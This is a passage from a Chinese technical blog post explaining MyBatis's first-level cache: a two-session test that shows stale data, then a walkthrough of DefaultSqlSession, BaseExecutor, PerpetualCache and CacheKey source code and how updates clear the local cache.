</span><br><span class="line">        SqlSession sqlSession2 = factory.openSession(<span class="keyword">true</span>); </span><br><span class="line">        StudentMapper studentMapper = sqlSession1.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        StudentMapper studentMapper2 = sqlSession2.getMapper(StudentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(<span class="string">"studentMapper读取数据: "</span> + studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">        System.out.println(<span class="string">"studentMapper读取数据: "</span> + studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">        System.out.println(<span class="string">"studentMapper2更新了"</span> + studentMapper2.updateStudentName(<span class="string">"小岑"</span>,<span class="number">1</span>) + <span class="string">"个学生的数据"</span>);</span><br><span class="line">        System.out.println(<span class="string">"studentMapper读取数据: "</span> + studentMapper.getStudentById(<span class="number">1</span>));</span><br><span class="line">        System.out.println(<span class="string">"studentMapper2读取数据: "</span> + studentMapper2.getStudentById(<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/f480ac76.jpg" alt="" /></p><p>sqlSession2更新了id为1的学生的姓名，从凯伦改为了小岑，但session1之后的查询中，id为1的学生的姓名还是凯伦，出现了脏数据，也证明了之前的设想，一级缓存只在数据库会话内部有效</p><h3 id="一级缓存工作流程源码分析"><a class="markdownIt-Anchor" href="#一级缓存工作流程源码分析"></a> 一级缓存工作流程&amp;源码分析</h3><p>那么，一级缓存的工作流程是怎样的呢？我们从源码层面来学习一下</p><h4 id="工作流程"><a class="markdownIt-Anchor" href="#工作流程"></a> 工作流程</h4><p>一级缓存执行额时序图，如下图所示</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/bb851700.png" alt="" /></p><h4 id="源码分析"><a class="markdownIt-Anchor" href="#源码分析"></a> 源码分析</h4><p>接下来将对Mybatis查询相关的核心类和一级缓存的源码进行走读。这对后面学习二级缓存也有帮助</p><p>**SqlSession：**对外提供了用户和数据库之间交互需要的所有方法，隐藏了底层的细节，默认实现类是<code>DefaultSqlSession</code></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-09-22%20%E4%B8%8A%E5%8D%8810.44.50.png" alt="" /></p><p><strong>Executor：</strong><code>SqlSession</code>向用户提供操作数据库的方法，但和数据库操作有关的职责都会委托给Executor</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-09-22%20%E4%B8%8A%E5%8D%8810.51.12.png" alt="" /></p><p>如下图所示，Executor有若干个实现类，为Executor赋予了不同的能力，大家可以根据类名，自行学习每个类的基本作用</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/83326eb3.jpg" alt="" /></p><p>在一级缓存的源码分析中，主要学习<code>BaseExecutor</code>的内部实现</p><p><strong>BaseExecutor：</strong><code>BaseExecutor</code>是一个实现了Executor接口的抽象类，定义若干抽象方法，在执行的时候，把具体的操作委托给子类进行执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">int</span> <span class="title">doUpdate</span><span class="params">(MappedStatement ms, Object parameter)</span> <span class="keyword">throws</span> SQLException</span>;</span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">abstract</span> List&lt;BatchResult&gt; <span class="title">doFlushStatements</span><span class="params">(<span class="keyword">boolean</span> isRollback)</span> <span class="keyword">throws</span> SQLException</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">abstract</span> &lt;E&gt; <span class="function">List&lt;E&gt; <span class="title">doQuery</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">abstract</span> &lt;E&gt; <span class="function">Cursor&lt;E&gt; <span class="title">doQueryCursor</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, BoundSql boundSql)</span> <span class="keyword">throws</span> SQLException</span>;</span><br></pre></td></tr></table></figure><p>在一级缓存的介绍中提到对<code>LocalCache</code>的查询和写入是在<code>Executor</code>内部完成的，在阅读<code>BaseExecutor</code>的代码中发现<code>LocalCache</code>是<code>BaseExecutor</code>内部的一个成员变量，如下代码所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseExecutor</span> <span class="keyword">implements</span> <span class="title">Executor</span> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> ConcurrentLinkedQueue&lt;BaseExecutor.DeferredLoad&gt; deferredLoads;</span><br><span class="line">    <span class="keyword">protected</span> PerpetualCache localCache;</span><br></pre></td></tr></table></figure><p>**Cache：**Mybatis中的Cache接口，提供了和缓存相关的最基本的操作，如下图所示</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/2020/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-09-22%20%E4%B8%8B%E5%8D%885.17.34.png" alt="" /></p><p>有若干个实现类，使用装饰器模式互相组装，提供丰富的操控缓存的能力，部分实现类如下图所示：</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/cdb21712.jpg" alt="" /><br /><code>BaseExecutor</code>成员变量之一的<code>PerpetualCache</code>，是对Cache接口最基本的实现，其实现非常简单，内部持有HashMap，对一级缓存的操作实则是对HashMap的操作。如下代码所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PerpetualCache</span> <span class="keyword">implements</span> <span class="title">Cache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;Object, Object&gt; cache = <span class="keyword">new</span> HashMap();</span><br></pre></td></tr></table></figure><p>为执行和数据库的交互，首先需要初始化<code>SqlSession</code>，通过<code>DefaultSqlSessionFactory</code>开启<code>SqlSession</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> SqlSession <span class="title">openSessionFromDataSource</span><span class="params">(ExecutorType execType, TransactionIsolationLevel level, <span class="keyword">boolean</span> autoCommit)</span> </span>&#123;</span><br><span class="line">  Transaction tx = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">  DefaultSqlSession var8;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    Environment environment = <span class="keyword">this</span>.configuration.getEnvironment();</span><br><span class="line">    TransactionFactory transactionFactory = <span class="keyword">this</span>.getTransactionFactoryFromEnvironment(environment);</span><br><span class="line">    tx = transactionFactory.newTransaction(environment.getDataSource(), level, autoCommit);</span><br><span class="line">    <span class="comment">// 重要的两行代码</span></span><br><span class="line">    Executor executor = <span class="keyword">this</span>.configuration.newExecutor(tx, execType);</span><br><span class="line">    var8 = <span class="keyword">new</span> DefaultSqlSession(<span class="keyword">this</span>.configuration, executor, autoCommit);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">    <span class="keyword">this</span>.closeTransaction(tx);</span><br><span class="line">    <span class="keyword">throw</span> ExceptionFactory.wrapException(<span class="string">"Error opening session.  Cause: "</span> + var12, var12);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ErrorContext.instance().reset();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> var8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在初始化<code>SqlSession</code>时，会使用<code>Configuration</code>类创建一个全新的<code>Executor</code>，作为<code>DefaultSqlSession</code>构造函数的参数，创建Executor代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Executor <span class="title">newExecutor</span><span class="params">(Transaction transaction, ExecutorType executorType)</span> </span>&#123;</span><br><span class="line">  executorType = executorType == <span class="keyword">null</span> ? <span class="keyword">this</span>.defaultExecutorType : executorType;</span><br><span class="line">  executorType = executorType == <span class="keyword">null</span> ? ExecutorType.SIMPLE : executorType;</span><br><span class="line">  Object executor;</span><br><span class="line">  <span class="keyword">if</span> (ExecutorType.BATCH == executorType) &#123;</span><br><span class="line">    executor = <span class="keyword">new</span> BatchExecutor(<span class="keyword">this</span>, transaction);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ExecutorType.REUSE == executorType) &#123;</span><br><span class="line">    executor = <span class="keyword">new</span> ReuseExecutor(<span class="keyword">this</span>, transaction);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    executor = <span class="keyword">new</span> SimpleExecutor(<span class="keyword">this</span>, transaction);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 这里需要注意的是，如果两级缓存开关开启的话，是使用CachingExecutor装饰BaseExecutor的子类</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.cacheEnabled) &#123;</span><br><span class="line">    executor = <span class="keyword">new</span> CachingExecutor((Executor)executor);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Executor executor = (Executor)<span class="keyword">this</span>.interceptorChain.pluginAll(executor);</span><br><span class="line">  <span class="keyword">return</span> executor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SqlSession</code>创建完毕后，根据Statment的不同类型，会进入<code>SqlSession</code>的不同方法中，如果是<code>Select</code>语句的话，最后会执行到<code>SqlSession</code>的<code>selectList</code>，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;E&gt; <span class="function">List&lt;E&gt; <span class="title">selectList</span><span class="params">(String statement, Object parameter, RowBounds rowBounds)</span> </span>&#123;</span><br><span class="line">  List var5;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    MappedStatement ms = <span class="keyword">this</span>.configuration.getMappedStatement(statement);</span><br><span class="line">    var5 = <span class="keyword">this</span>.executor.query(ms, <span class="keyword">this</span>.wrapCollection(parameter), rowBounds, Executor.NO_RESULT_HANDLER);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">    <span class="keyword">throw</span> ExceptionFactory.wrapException(<span class="string">"Error querying database.  Cause: "</span> + var9, var9);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ErrorContext.instance().reset();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> var5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SqlSession</code>把具体的查询职责委托给了Executor。如果只开启一级缓存的话，首先会进入<code>BaseExecutor</code>的<code>query</code>方法。代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;E&gt; <span class="function">List&lt;E&gt; <span class="title">query</span><span class="params">(MappedStatement ms, Object parameter, RowBounds rowBounds, ResultHandler resultHandler)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">  BoundSql boundSql = ms.getBoundSql(parameter);</span><br><span class="line">  CacheKey key = <span class="keyword">this</span>.createCacheKey(ms, parameter, rowBounds, boundSql);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.query(ms, parameter, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中，会先根据传入的参数生成CacheKey，进入该方法查看CacheKey是如何生成的，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> CacheKey <span class="title">createCacheKey</span><span class="params">(MappedStatement ms, Object parameterObject, RowBounds rowBounds, BoundSql boundSql)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.closed) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ExecutorException(<span class="string">"Executor was closed."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    CacheKey cacheKey = <span class="keyword">new</span> CacheKey();</span><br><span class="line">    cacheKey.update(ms.getId());</span><br><span class="line">    cacheKey.update(rowBounds.getOffset());</span><br><span class="line">    cacheKey.update(rowBounds.getLimit());</span><br><span class="line">    cacheKey.update(boundSql.getSql());</span><br><span class="line">    <span class="comment">// 后面是update了sql中带的参数</span></span><br><span class="line">    List&lt;ParameterMapping&gt; parameterMappings = boundSql.getParameterMappings();</span><br><span class="line">    TypeHandlerRegistry typeHandlerRegistry = ms.getConfiguration().getTypeHandlerRegistry();</span><br><span class="line">    Iterator var8 = parameterMappings.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var8.hasNext()) &#123;</span><br><span class="line">      ParameterMapping parameterMapping = (ParameterMapping)var8.next();</span><br><span class="line">      <span class="keyword">if</span> (parameterMapping.getMode() != ParameterMode.OUT) &#123;</span><br><span class="line">        String propertyName = parameterMapping.getProperty();</span><br><span class="line">        Object value;</span><br><span class="line">        <span class="keyword">if</span> (boundSql.hasAdditionalParameter(propertyName)) &#123;</span><br><span class="line">          value = boundSql.getAdditionalParameter(propertyName);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (parameterObject == <span class="keyword">null</span>) &#123;</span><br><span class="line">          value = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (typeHandlerRegistry.hasTypeHandler(parameterObject.getClass())) &#123;</span><br><span class="line">          value = parameterObject;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          MetaObject metaObject = <span class="keyword">this</span>.configuration.newMetaObject(parameterObject);</span><br><span class="line">          value = metaObject.getValue(propertyName);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 最终需要的生成结果</span></span><br><span class="line">        cacheKey.update(value);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.configuration.getEnvironment() != <span class="keyword">null</span>) &#123;</span><br><span class="line">      cacheKey.update(<span class="keyword">this</span>.configuration.getEnvironment().getId());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cacheKey;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的代码中，将<code>MappedStatement</code>的Id、SQL的offset、SQL的limit、SQL本身以及SQL中的参数传入了CacheKey这个类，最终构成CacheKey。以下是这个类的内部结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_MULTIPLYER = <span class="number">37</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_HASHCODE = <span class="number">17</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> multiplier;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> hashcode;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">long</span> checksum;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line"><span class="keyword">private</span> List&lt;Object&gt; updateList;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CacheKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.hashcode = DEFAULT_HASHCODE;</span><br><span class="line">  <span class="keyword">this</span>.multiplier = DEFAULT_MULTIPLYER;</span><br><span class="line">  <span class="keyword">this</span>.count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">this</span>.updateList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是成员变量和构造函数，有一个初始的<code>hashCode</code>和乘数，同时维护了一个内部的<code>updateList</code>。在<code>CacheKey</code>的<code>update</code>方法中，会进行一个<code>hashCode</code>和<code>checkSum</code>的计算，同时把传入的参数添加进<code>updateList</code>中，如下代码所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> baseHashCode = object == <span class="keyword">null</span> ? <span class="number">1</span> : ArrayUtil.hashCode(object);</span><br><span class="line">  ++<span class="keyword">this</span>.count;</span><br><span class="line">  <span class="keyword">this</span>.checksum += (<span class="keyword">long</span>)baseHashCode;</span><br><span class="line">  baseHashCode *= <span class="keyword">this</span>.count;</span><br><span class="line">  <span class="keyword">this</span>.hashcode = <span class="keyword">this</span>.multiplier * <span class="keyword">this</span>.hashcode + baseHashCode;</span><br><span class="line">  <span class="keyword">this</span>.updateList.add(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时重写了<code>CacheKey</code>的<code>equals</code>方法，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span> == object) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(object <span class="keyword">instanceof</span> CacheKey)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    CacheKey cacheKey = (CacheKey)object;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.hashcode != cacheKey.hashcode) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.checksum != cacheKey.checksum) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.count != cacheKey.count) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.updateList.size(); ++i) &#123;</span><br><span class="line">        Object thisObject = <span class="keyword">this</span>.updateList.get(i);</span><br><span class="line">        Object thatObject = cacheKey.updateList.get(i);</span><br><span class="line">        <span class="keyword">if</span> (!ArrayUtil.equals(thisObject, thatObject)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除去hashCode、checksum和count的比较外，只要updatelist中的元素一一对应相等，那么就可以认为是CacheKey相等。只要两条SQL的下列五个值相同，即可以认为是相同的SQL</p><blockquote><p>Statement Id + Offset + Limit + Sql + Params</p></blockquote><p>BaseExecutor的query方法继续往下走，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">list = resultHandler == <span class="keyword">null</span> ? (List)<span class="keyword">this</span>.localCache.getObject(key) : <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (list != <span class="keyword">null</span>) &#123;</span><br><span class="line">  <span class="keyword">this</span>.handleLocallyCachedOutputParameters(ms, key, parameter, boundSql);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  list = <span class="keyword">this</span>.queryFromDatabase(ms, parameter, rowBounds, resultHandler, key, boundSql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果查不到的话，就从数据库查，在<code>queryFromDataBase</code>中，会对<code>localCache</code>进行写入</p><p>在<code>query</code>方法执行的最后，会判断一级缓存级别是否是<code>STATEMENT</code>级别，如果是的话，就清空缓存，这也就是<code>STATEMENT</code>级别的一级缓存无法共享<code>localCache</code>的原因。代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.configuration.getLocalCacheScope() == LocalCacheScope.STATEMENT) &#123;</span><br><span class="line">  <span class="keyword">this</span>.clearLocalCache();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在源码分析的最后，我们确认一下，如果是<code>insert/delete/update</code>方法，缓存就会刷新的原因</p><p><code>SqlSession</code>的<code>insert</code>方法和<code>delete</code>方法，就会统一走<code>update</code>的流程，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">insert</span><span class="params">(String statement, Object parameter)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.update(statement, parameter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">delete</span><span class="params">(String statement, Object parameter)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.update(statement, parameter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">update</span><span class="params">(String statement, Object parameter)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> var4;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.dirty = <span class="keyword">true</span>;</span><br><span class="line">    MappedStatement ms = <span class="keyword">this</span>.configuration.getMappedStatement(statement);</span><br><span class="line">    var4 = <span class="keyword">this</span>.executor.update(ms, <span class="keyword">this</span>.wrapCollection(parameter));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">    <span class="keyword">throw</span> ExceptionFactory.wrapException(<span class="string">"Error updating database.  Cause: "</span> + var8, var8);</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ErrorContext.instance().reset();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> var4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>update</code>方法也是委托给了<code>Executor</code>执行。<code>BaseExecutor</code>的执行方法如下所示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">update</span><span class="params">(MappedStatement ms, Object parameter)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">  ErrorContext.instance().resource(ms.getResource()).activity(<span class="string">"executing an update"</span>).object(ms.getId());</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.closed) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ExecutorException(<span class="string">"Executor was closed."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.clearLocalCache();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.doUpdate(ms, parameter);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每次执行<code>update</code>前都会清空<code>localCache</code></p><p>至此，一级缓存的工作流程讲解以及源码分析完毕</p><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h3><p>1、Mybatis一级缓存的生命周期和SqlSession一致</p><p>2、Mybatis一级缓存内部设计简单，只是一个没有容量限定的HashMap，在缓存的功能性上有所欠缺</p><p>3、Mybatis的一级缓存最大范围是SqlSession内部，有多个SqlSession或者分布式的环境下，数据库写操作会引起脏数据，建议设定缓存级别为Statement</p><h2 id="二级缓存"><a class="markdownIt-Anchor" href="#二级缓存"></a> 二级缓存</h2><h3 id="二级缓存介绍"><a class="markdownIt-Anchor" href="#二级缓存介绍"></a> 